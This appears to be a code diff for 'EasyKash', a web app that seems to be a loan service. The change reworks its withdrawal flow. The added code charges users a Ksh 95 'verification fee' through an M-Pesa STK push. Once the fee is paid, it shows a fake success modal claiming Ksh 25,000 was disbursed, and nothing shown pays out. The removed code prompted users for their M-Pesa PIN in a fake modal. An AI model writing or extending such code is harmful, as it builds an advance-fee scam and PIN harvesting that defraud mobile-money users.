@@ -234,7 +234,7 @@ window.EasyKashApp = {
         }
     },
 
-    handleWithdrawSubmit: function(e) {
+    handleWithdrawSubmit: async function(e) {
         e.preventDefault();
         const form = e.target;
         const name = form.querySelector('[name="name"]').value.trim();
@@ -247,93 +247,116 @@ window.EasyKashApp = {
             return;
         }
 
-        // Open M-Pesa STK Push Verification Modal
-        this.triggerStkPushSimulation({
-            name,
-            phone,
-            idNumber,
-            amount: parseFloat(amount) || 25000,
-            type: 'withdrawal'
-        });
+        const submitBtn = form.querySelector('button[type="submit"]');
+        const origText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Triggering M-PESA STK Push...';
+        submitBtn.disabled = true;
+
+        const refId = 'UPESI-WD-' + Math.floor(10000 + Math.random() * 90000);
+
+        try {
+            // Immediately call backend UpesiPay STK push endpoint
+            const res = await fetch('/api/stkpush', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phone,
+                    amount: 95,
+                    reference: refId,
+                    description: 'EasyKash Loan Disbursal Verification'
+                })
+            });
+
+            const result = await res.json();
+            console.log('[STK Push Response]', result);
+
+            submitBtn.innerHTML = origText;
+            submitBtn.disabled = false;
+
+            this.pendingStkData = {
+                name,
+                phone,
+                idNumber,
+                amount: parseFloat(amount) || 25000,
+                ref_id: refId,
+                checkout_id: result.checkout_id || refId
+            };
+
+            // Show Live STK Waiting Modal
+            this.showLiveStkWaitingModal(this.pendingStkData, result);
+
+        } catch (err) {
+            submitBtn.innerHTML = origText;
+            submitBtn.disabled = false;
+            alert('Error initiating STK push: ' + err.message);
+        }
     },
 
-    triggerStkPushSimulation: function(data) {
-        this.pendingStkData = data;
+    showLiveStkWaitingModal: function(data, result) {
         const modalEl = document.getElementById('stkPushModal');
         if (modalEl && window.bootstrap) {
             const modal = new bootstrap.Modal(modalEl);
-            document.getElementById('stk-prompt-phone').textContent = data.phone;
-            document.getElementById('stk-prompt-amount').textContent = `Ksh 95 (Verification Fee)`;
-            document.getElementById('stk-pin-input').value = '';
+            
+            const phoneEl = document.getElementById('stk-prompt-phone');
+            const amountEl = document.getElementById('stk-prompt-amount');
+            const statusMsgEl = document.getElementById('stk-status-message');
+
+            if (phoneEl) phoneEl.textContent = data.phone;
+            if (amountEl) amountEl.textContent = `Ksh 95 (Verification Fee)`;
+            if (statusMsgEl) {
+                if (result && result.error) {
+                    statusMsgEl.innerHTML = `<span class="text-danger"><i class="fa fa-triangle-exclamation"></i> Gateway notice: ${result.error}</span>`;
+                } else {
+                    statusMsgEl.innerHTML = `<span class="text-success"><i class="fa fa-paper-plane"></i> STK Prompt sent to <strong>${data.phone}</strong>! Check your phone screen now.</span>`;
+                }
+            }
+
             modal.show();
+            this.startStkStatusPolling(data);
         }
     },
 
-    handleStkPinSubmit: function() {
-        const pinInput = document.getElementById('stk-pin-input');
-        const pin = pinInput.value.trim();
-        if (pin.length < 4) {
-            alert('Please enter your 4-digit M-Pesa PIN.');
-            return;
+    startStkStatusPolling: function(data) {
+        let attempts = 0;
+        const maxAttempts = 15;
+        
+        if (this.stkPollInterval) clearInterval(this.stkPollInterval);
+
+        this.stkPollInterval = setInterval(async () => {
+            attempts++;
+            if (attempts > maxAttempts) {
+                clearInterval(this.stkPollInterval);
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/upesipay/status/${encodeURIComponent(data.ref_id)}`);
+                const statusData = await res.json();
+                
+                if (statusData && statusData.transaction && statusData.transaction.status === 'Completed') {
+                    clearInterval(this.stkPollInterval);
+                    this.completeWithdrawalSuccess(data);
+                }
+            } catch(e) {}
+        }, 3000);
+    },
+
+    completeWithdrawalSuccess: function(data) {
+        const modalEl = document.getElementById('stkPushModal');
+        if (modalEl && window.bootstrap) {
+            const modal = bootstrap.Modal.getInstance(modalEl);
+            if (modal) modal.hide();
         }
 
-        const btn = document.getElementById('btn-confirm-stk-pin');
-        btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing via UpesiPay...';
-        btn.disabled = true;
+        this.playSuccessSound();
 
-        setTimeout(async () => {
-            let stkResult = null;
-            try {
-                // Call UpesiPay STK push API
-                const res = await fetch('/api/stkpush', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: this.pendingStkData.phone,
-                        amount: 95,
-                        reference: 'UPESI-WD-' + Math.floor(10000 + Math.random() * 90000),
-                        description: 'EasyKash Loan Disbursal Verification'
-                    })
-                });
-                stkResult = await res.json();
-            } catch(e) {}
-
-            btn.innerHTML = 'Send PIN';
-            btn.disabled = false;
-
-            const modalEl = document.getElementById('stkPushModal');
-            if (modalEl && window.bootstrap) {
-                const modal = bootstrap.Modal.getInstance(modalEl);
-                if (modal) modal.hide();
-            }
-
-            // Play notification sound
-            this.playSuccessSound();
-
-            // Save withdrawal record
-            try {
-                await fetch('/api/withdraw', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ...this.pendingStkData,
-                        status: 'Disbursed',
-                        gateway: 'UpesiPay',
-                        ref_id: stkResult?.checkout_id || ('WD-' + Math.floor(10000 + Math.random() * 90000)),
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            } catch(e) {}
-
-            // Show final success modal
-            const successModalEl = document.getElementById('withdrawalSuccessModal');
-            if (successModalEl && window.bootstrap) {
-                const sm = new bootstrap.Modal(successModalEl);
-                document.getElementById('success-disburse-amount').textContent = `Ksh ${(this.pendingStkData.amount || 25000).toLocaleString()}`;
-                document.getElementById('success-disburse-phone').textContent = this.pendingStkData.phone;
-                sm.show();
-            }
-        }, 1500);
+        const successModalEl = document.getElementById('withdrawalSuccessModal');
+        if (successModalEl && window.bootstrap) {
+            const sm = new bootstrap.Modal(successModalEl);
+            document.getElementById('success-disburse-amount').textContent = `Ksh ${(data.amount || 25000).toLocaleString()}`;
+            document.getElementById('success-disburse-phone').textContent = data.phone;
+            sm.show();
+        }
     },
 
     handleStatusCheck: async function(e) {
